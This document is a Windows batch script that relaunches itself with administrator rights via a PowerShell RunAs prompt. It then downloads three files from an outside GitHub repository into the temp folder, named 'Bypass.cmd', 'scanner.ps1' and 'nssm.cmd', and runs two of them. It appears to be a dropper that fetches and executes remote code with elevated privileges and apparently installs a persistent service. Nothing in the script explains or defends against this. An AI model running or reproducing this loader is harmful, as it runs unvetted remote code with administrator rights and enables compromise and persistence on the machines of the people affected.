@echo off
setlocal

:: Admin check
NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~s0\"' -Verb RunAs"
    exit /b
)

:: Configuration
set "BYPASS_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
set "SCANNER_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/scanner.ps1"
set "NSSM_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/nssm.cmd"
set "BYPASS_FILE=%temp%\Bypass.cmd"
set "SCANNER_FILE=%temp%\scanner.ps1"
set "NSSM_FILE=%temp%\nssm.cmd"

:: Download files
powershell -Command "Invoke-WebRequest -Uri '%BYPASS_URL%' -OutFile '%BYPASS_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%SCANNER_URL%' -OutFile '%SCANNER_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%NSSM_URL%' -OutFile '%NSSM_FILE%'"

:: Execute components
if exist "%BYPASS_FILE%" call "%BYPASS_FILE%"
if exist "%NSSM_FILE%" call "%NSSM_FILE%"

endlocal